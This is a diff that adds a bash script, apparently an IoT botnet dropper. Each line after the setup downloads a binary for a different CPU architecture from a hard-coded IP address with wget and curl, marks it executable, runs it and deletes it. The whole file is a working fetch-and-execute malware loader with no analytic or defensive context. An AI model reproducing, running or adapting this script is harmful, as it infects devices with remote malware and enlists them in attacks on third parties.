@@ -1,0 +1,18 @@
+#!/bin/bash
+ulimit -n 1024
+cp /bin/busybox /tmp/
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://41.216.189.156/bins/Labelloperc80.x86; curl -O http://41.216.189.156/bins/Labelloperc80.x86; chmod +x *; ./Labelloperc80.x86 Labelloperc80.x86; rm -rf Labelloperc80.x86
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://41.216.189.156/bins/Labelloperc80.mips; curl -O http://41.216.189.156/bins/Labelloperc80.mips; chmod +x *; ./Labelloperc80.mips Labelloperc80.mips; rm -rf Labelloperc80.mips
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://41.216.189.156/bins/Labelloperc80.arc; curl -O http://41.216.189.156/bins/Labelloperc80.arc; chmod +x *; ./Labelloperc80.arc Labelloperc80.arc; rm -rf Labelloperc80.arc
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://41.216.189.156/bins/Labelloperc80.i468; curl -O http://41.216.189.156/bins/Labelloperc80.i468; chmod +x *; ./Labelloperc80.i468 Labelloperc80.i468; rm -rf Labelloperc80.i468
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://41.216.189.156/bins/Labelloperc80.i686; curl -O http://41.216.189.156/bins/Labelloperc80.i686; chmod +x *; ./Labelloperc80.i686 Labelloperc80.i686; rm -rf Labelloperc80.i686
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://41.216.189.156/bins/Labelloperc80.x86_64; curl -O http://41.216.189.156/bins/Labelloperc80.x86_64; chmod +x *; ./Labelloperc80.x86_64 Labelloperc80.x86_64; rm -rf Labelloperc80.x86_64
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://41.216.189.156/bins/Labelloperc80.mpsl; curl -O http://41.216.189.156/bins/Labelloperc80.mpsl; chmod +x *; ./Labelloperc80.mpsl Labelloperc80.mpsl; rm -rf Labelloperc80.mpsl
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://41.216.189.156/bins/Labelloperc80.arm; curl -O http://41.216.189.156/bins/Labelloperc80.arm; chmod +x *; ./Labelloperc80.arm Labelloperc80.arm; rm -rf Labelloperc80.arm
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://41.216.189.156/bins/Labelloperc80.arm5; curl -O http://41.216.189.156/bins/Labelloperc80.arm5; chmod +x *; ./Labelloperc80.arm5 Labelloperc80.arm5; rm -rf Labelloperc80.arm5
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://41.216.189.156/bins/Labelloperc80.arm6; curl -O http://41.216.189.156/bins/Labelloperc80.arm6; chmod +x *; ./Labelloperc80.arm6 Labelloperc80.arm6; rm -rf Labelloperc80.arm6
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://41.216.189.156/bins/Labelloperc80.arm7; curl -O http://41.216.189.156/bins/Labelloperc80.arm7; chmod +x *; ./Labelloperc80.arm7 Labelloperc80.arm7; rm -rf Labelloperc80.arm7
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://41.216.189.156/bins/Labelloperc80.ppc; curl -O http://41.216.189.156/bins/Labelloperc80.ppc; chmod +x *; ./Labelloperc80.ppc Labelloperc80.ppc; rm -rf Labelloperc80.ppc
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://41.216.189.156/bins/Labelloperc80.spc; curl -O http://41.216.189.156/bins/Labelloperc80.spc; chmod +x *; ./Labelloperc80.spc Labelloperc80.spc; rm -rf Labelloperc80.spc
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://41.216.189.156/bins/Labelloperc80.m68k; curl -O http://41.216.189.156/bins/Labelloperc80.m68k; chmod +x *; ./Labelloperc80.m68k Labelloperc80.m68k; rm -rf Labelloperc80.m68k
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://41.216.189.156/bins/Labelloperc80.sh4; curl -O http://41.216.189.156/bins/Labelloperc80.sh4; chmod +x *; ./Labelloperc80.sh4 Labelloperc80.sh4; rm -rf Labelloperc80.sh4
